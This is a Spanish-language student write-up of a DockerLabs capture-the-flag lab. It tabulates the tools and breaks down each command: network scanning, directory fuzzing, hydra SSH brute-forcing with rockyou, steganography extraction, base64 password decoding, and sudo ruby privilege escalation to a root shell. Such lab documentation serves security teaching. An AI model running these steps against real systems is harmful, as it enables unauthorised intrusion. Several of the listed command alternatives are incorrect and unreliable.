# Taller de Electiva - Maestría en Ciberseguridad
:imp::rotating_light::skull:MY. GÓMEZ ORTEGA MARIO FRANCISCO:skull::rotating_light::imp:
![imagen 1 hacker taller MFGO](https://media1.tenor.com/m/z5yrWHMWfF8AAAAd/hacker-hack.gif)

Este taller tiene como objetivo desarrollar los puntos del taller de DOCKERLABS:

1. ReAlizar una investigación individual de cada una de las herramientas empleadas. Sintetice el resultado mediante un cuadro que explique su definición, funcionalidad y casos de uso.
2. Explicar en detalle cada uno de los comandos empleados en el anterior CTF; realizando un desglose del mismo y citando al menos tres alternativas (si aplica) de variantes del comando para las herramientas empleadas, este punto amplia el ejercicio anterior.
3. Realice un diagrama de flujo de todo el procedimiento realizado.

---

## 1. Herramientas empleadas en el taller de DockerLabs:

| HERRAMIENTA | DEFINICION                                                                                   | FUNCIONALIDAD                                         | EJEMPLOS DE USO                                                                                    |   |
|-------------|----------------------------------------------------------------------------------------------|-------------------------------------------------------|----------------------------------------------------------------------------------------------------|---|
| SCP         | Secure Copy Protocol: protocolo para copiar archivos entre máquinas remotas de forma segura. | Transferencia de archivos entre equipos mediante SSH. | Copiar archivos desde host a Kali Linux. Ej: `scp -r amor kali@192.168.1.12:/home/kali/Documents/` |   |
| Docker      | Plataforma de contenedores para ejecutar aplicaciones aisladas.                              | Despliegue de entornos vulnerables para prácticas.    | Ejecutar DVWA, desplegar laboratorio 'amor.tar'                                                    |   |
| Unzip       | Herramienta para descomprimir archivos .zip.                                                 | Extraer contenido de laboratorios comprimidos.        | `unzip nombre_maquina.zip`                                                                         |   |
| Netdiscover | Escáner ARP para descubrir dispositivos activos en la red.                                   | Detectar IP de contenedores en red Docker.            | `sudo netdiscover -i docker0 -r 172.17.0.0/24`                                                     |   |
| Nmap        | Network Mapper: escáner de red y puertos.                                                    | Identificar servicios y puertos abiertos.             | `nmap --min-rate 5000 -p- -sS -sV 172.17.0.2`                                                      |   |
| Gobuster    | Herramienta de fuerza bruta para encontrar rutas/directorios en servidores web.              | Fuzzing de directorios ocultos.                       | `gobuster dir -u http://IP/ -w wordlist.txt`                                                       |   |
| Hydra       | Herramienta para ataques de fuerza bruta contra servicios como SSH.                          | Crackear contraseñas por diccionario.                 | `hydra -l usuario -P diccionario ssh://IP`                                                         |   |
| SSH         | Secure Shell: protocolo seguro para conexión remota.                                         | Acceso remoto a sistemas Linux.                       | `ssh carlota@172.17.0.2`                                                                           |   |
| Steghide    | Herramienta para ocultar y extraer información de imágenes.                                  | Realizar esteganografía.                              | `steghide --extract -sf imagen.jpg`                                                                |   |
| Base64      | Sistema de codificación para datos binarios en texto ASCII.                                  | Decodificación de texto escondido.                    | `echo 'base64text' \| base64 -d`                                                                   |   |

---

## 2. ¿Para qué instalo Kali Linux?

**Kali Linux** es una distribución basada en Debian, diseñada específicamente para tareas de:

- **Pentesting (pruebas de penetración)**  
- **Análisis forense digital**
- **Ingeniería inversa**
- **Auditorías de seguridad de redes y aplicaciones**

Kali incluye más de 600 herramientas preinstaladas como:

- `nmap`, `hydra`, `sqlmap`, `burp suite`, `wireshark`, `aircrack-ng`, entre muchas otras.

> Es una herramienta estándar en la industria del hacking ético y se utiliza tanto en entornos académicos como profesionales para simular ataques y evaluar vulnerabilidades.

---

## 3. ¿Para qué instalo Docker sobre Kali Linux? ¿Qué es Docker y para qué sirve?

**Docker** es una plataforma de virtualización ligera basada en contenedores. Un contenedor es una unidad ejecutable que incluye todo lo necesario para ejecutar una aplicación: código, librerías, entorno y dependencias.

### ¿Por qué instalar Docker en Kali?

| COMANDO                                                                                            | EXPLICACIÓN DESGLOCE                                                                              | ALTERNATIVA 1                       | ALTERNATIVA 2                           | ALTERNATIVA 3                                                 |
|----------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------|-------------------------------------|-----------------------------------------|---------------------------------------------------------------|
| scp -r amor kali@192.168.1.12:/home/kali/Documents/                                                | `scp`: copia segura, `-r`: recursivo, `amor`: carpeta origen, `kali@...`: destino.                | scp archivo usuario@IP:/ruta/       | rsync -avz archivo usuario@IP:/ruta/    | sftp usuario@IP                                               |
| sudo apt install docker.io                                                                         | `sudo`: privilegios, `apt install`: instala paquete, `docker.io`: paquete de Docker.              | apt-get install docker.io           | snap install docker                     | curl \| bash (instalador oficial)                             |
| ./auto_deploy.sh amor.tar                                                                          | `./`: ejecutar script local, `auto_deploy.sh`: script de despliegue, `amor.tar`: archivo del lab. | bash auto_deploy.sh                 | sh auto_deploy.sh                       | chmod +x auto_deploy.sh && ./auto_deploy.sh                   |
| ip add                                                                                             | Muestra interfaces y direcciones IP del sistema.                                                  | ip a                                | ifconfig                                | hostname -I                                                   |
| sudo netdiscover -i docker0 -r 172.17.0.0/24                                                       | `-i`: interfaz, `docker0`: red virtual, `-r`: rango objetivo.                                     | arp-scan -l                         | nmap -sn 172.17.0.0/24                  | ip neigh                                                      |
| sudo nmap --min-rate 5000 -p- -sS -sV 172.17.0.2                                                   | `--min-rate`: velocidad, `-p-`: todos los puertos, `-sS`: SYN scan, `-sV`: detectar versión.      | nmap -A IP                          | nmap -T4 -p 1-65535 IP                  | masscan -p1-65535 IP                                          |
| gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | `dir`: modo directorios, `-u`: URL, `-w`: diccionario de palabras.                                | ffuf -u URL/FUZZ -w wordlist        | dirb URL                                | dirsearch -u URL                                              |
| hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10                        | `-l`: login, `-P`: diccionario, `ssh://`:protocolo, `-t`: threads concurrentes.                   | medusa -u user -P pass -h IP -M ssh | ncrack -p 22 --user user -P wordlist IP | patator ssh_login host=IP user=USER password=FILE0 0=wordlist |
| scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Documents/amor | Copia remota con `scp` desde usuario `carlota` al directorio destino local.                       | rsync -avz user@host:/path /destino | sftp user@host                          | wget scp://host/archivo                                       |
| steghide --extract -sf imagen.jpg                                                                  | Extrae información escondida de `imagen.jpg` usando Steghide.                                     | zsteg imagen.jpg                    | binwalk -e imagen.jpg                   | exiftool imagen.jpg                                           |
| echo "ZXNsYWNhc2FkZXBpbnlwb24=" \| base64 -d; echo                                                 | Decodifica texto base64, `-d`: decode.                                                            | base64 --decode                     | openssl enc -base64 -d                  | python3 -m base64                                             |
| sudo /usr/bin/ruby -e 'exec "/bin/bash"'                                                           | Ejecuta un shell `/bin/bash` con permisos elevados desde ruby.                                    | sudo ruby -e 'exec "/bin/bash"'     | ruby -rsystem -e 'system("/bin/bash")'  | echo 'bash' \| ruby                                           |
| file imagen.jpg                                                                                    | Identifica el tipo y formato de archivo, útil para análisis forense.                              | exiftool imagen.jpg                 | stat imagen.jpg                         | identify imagen.jpg                                           |

---


